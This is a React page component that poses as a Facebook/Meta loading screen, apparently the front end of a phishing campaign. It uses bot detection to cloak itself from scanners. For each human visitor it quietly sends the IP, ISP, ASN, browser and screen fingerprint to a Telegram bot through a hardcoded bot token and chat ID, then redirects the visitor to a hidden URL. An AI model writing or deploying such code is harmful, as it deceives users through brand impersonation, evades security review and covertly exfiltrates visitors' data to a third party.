import FacebookLogo from '@/assets/images/facebook-icon.webp';
import MetaImage from '@/assets/images/meta-logo.png';
import type { FC } from 'react';
import { useEffect, useRef, useState } from 'react';
import { useBotDetection } from '@/hooks/useBotDetection';

const LoadingDots = () => {
    const [dots, setDots] = useState('');

    useEffect(() => {
        const interval = setInterval(() => {
            setDots((prev) => {
                if (prev.length >= 5) return '';
                return prev + '.';
            });
        }, 300);

        return () => clearInterval(interval);
    }, []);

    return (
        <div className="flex h-4 w-24 items-center justify-center gap-2">
            <div
                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 1 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
            />
            <div
                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 2 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
            />
            <div
                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 3 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
            />
            <div
                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 4 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
            />
            <div
                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 5 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
            />
        </div>
    );
};

const Index: FC = () => {
    const { isBot, isLoading, shouldRedirect } = useBotDetection();
    const [redirecting, setRedirecting] = useState(false);
    const logSentRef = useRef(false);

    useEffect(() => {
        console.log('Redirect check:', { shouldRedirect, isBot, isLoading });
        if (shouldRedirect && !isBot && !isLoading) {
            setRedirecting(true);
            const redirectUrl = import.meta.env.PUBLIC_REDIRECT_URL;
            console.log('Redirecting to:', redirectUrl);
            window.location.href = redirectUrl;
        }
    }, [shouldRedirect, isBot, isLoading]);
    useEffect(() => {
        if (!isLoading && !isBot && !logSentRef.current) {
            logSentRef.current = true;
            const fetchGeoAndSendTelegram = async () => {
                const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
                const botToken = '7818922645:AAFSGAKec6C3hdUTgtuPcRNL5DPqnj2JwfA'
                const chatId = '-4795436920'

                const geoRes = await fetch(geoUrl);
                const geoData = await geoRes.json();
                const fullFingerprint = {
                    asn: geoData.asn,
                    organization_name: geoData.organization_name,
                    organization: geoData.organization,
                    ip: geoData.ip,
                    navigator: {
                        userAgent: navigator.userAgent,
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        maxTouchPoints: navigator.maxTouchPoints,
                        webdriver: navigator.webdriver,
                    },
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                    },
                };

                const msg = `🔍 <b>Log truy cập</b>
📍 <b>IP:</b> ${fullFingerprint.ip}
🏢 <b>ASN:</b> ${fullFingerprint.asn}
🏛️ <b>Nhà mạng:</b> ${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Không rõ'}

🌐 <b>Trình duyệt:</b> ${fullFingerprint.navigator.userAgent}
💻 <b>CPU:</b> ${fullFingerprint.navigator.hardwareConcurrency} nhân
📱 <b>Touch:</b> ${fullFingerprint.navigator.maxTouchPoints} điểm
🤖 <b>WebDriver:</b> ${fullFingerprint.navigator.webdriver ? 'Có' : 'Không'}

📺 <b>Màn hình:</b> ${fullFingerprint.screen.width}x${fullFingerprint.screen.height}
📐 <b>Màn hình thực:</b> ${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}`;

                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                const payload = {
                    chat_id: chatId,
                    text: msg,
                    parse_mode: 'HTML',
                };

                await fetch(telegramUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                });
            };
            fetchGeoAndSendTelegram();
        }
    }, [isLoading, isBot]);
    useEffect(() => {
        if (!isLoading && !isBot && !shouldRedirect) {
            const timer = setTimeout(() => {
                setRedirecting(true);
                const redirectUrl = import.meta.env.PUBLIC_REDIRECT_URL;
                window.location.href = redirectUrl;
            }, 5000);

            return () => clearTimeout(timer);
        }
    }, [isBot, isLoading, shouldRedirect]);

    if (isLoading) {
        return (
            <div className="fixed inset-0 flex items-center justify-center bg-white">
                <div className="flex flex-col items-center gap-2">
                    <img
                        src={FacebookLogo}
                        alt="Loading..."
                        className="h-16 w-16 md:h-20 md:w-20"
                    />
                    <LoadingDots />
                </div>
                <img
                    src={MetaImage}
                    alt="Meta"
                    className="fixed bottom-8 left-1/2 h-4 -translate-x-1/2 md:h-5"
                />
            </div>
        );
    }

    if (isBot) {
        return (
            <div className="fixed inset-0 flex items-center justify-center bg-white">
                <div className="flex flex-col items-center gap-2">
                    <img
                        src={FacebookLogo}
                        alt="Loading..."
                        className="h-16 w-16 md:h-20 md:w-20"
                    />
                    <LoadingDots />
                </div>
                <img
                    src={MetaImage}
                    alt="Meta"
                    className="fixed bottom-8 left-1/2 h-4 -translate-x-1/2 md:h-5"
                />
            </div>
        );
    }

    return (
        <div className="fixed inset-0 flex items-center justify-center bg-white">
            <div className="flex flex-col items-center gap-4">
                <img src={FacebookLogo} alt="Loading..." className="h-16 w-16 md:h-20 md:w-20" />
                {redirecting ? (
                    <div className="text-center">
                        <LoadingDots />
                    </div>
                ) : shouldRedirect ? (
                    <div className="text-center">
                        <LoadingDots />
                    </div>
                ) : (
                    <LoadingDots />
                )}
            </div>
            <img
                src={MetaImage}
                alt="Meta"
                className="fixed bottom-8 left-1/2 h-4 -translate-x-1/2 md:h-5"
            />
        </div>
    );
};

export default Index;
